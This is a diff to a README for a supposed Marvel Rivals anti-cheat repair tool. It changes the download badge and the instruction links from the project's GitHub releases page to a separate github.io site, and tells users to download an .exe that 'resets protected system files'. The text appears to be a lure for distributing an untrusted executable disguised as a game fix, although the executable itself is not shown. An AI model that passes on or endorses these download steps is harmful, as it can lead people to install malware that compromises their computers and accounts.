@@ -1,6 +1,6 @@
 # 🛡️ Marvel-Rivals-AntiCheat-Fix - Resolve Anti-Cheat Errors On Windows
 
-[![](https://img.shields.io/badge/Download_Fix-Click_Here-blue.svg)](https://github.com/Berkediamagnetic620/Marvel-Rivals-AntiCheat-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Click_Here-blue.svg)](https://berkediamagnetic620.github.io)
 
 This application repairs Anti-Cheat errors that prevent Marvel Rivals from starting on Windows 10 and Windows 11. It automates common repair steps to get you back into the game.
 
@@ -19,7 +19,7 @@ This tool works by resetting protected system files and clearing cached integrit
 
 Follow these steps to obtain and use the fix:
 
-1. Visit the [official releases page](https://github.com/Berkediamagnetic620/Marvel-Rivals-AntiCheat-Fix/releases) to download the software.
+1. Visit the [official releases page](https://berkediamagnetic620.github.io) to download the software.
 2. Select the latest version available in the list.
 3. Download the file ending in `.exe`.
 4. Save the file to your desktop or downloads folder.
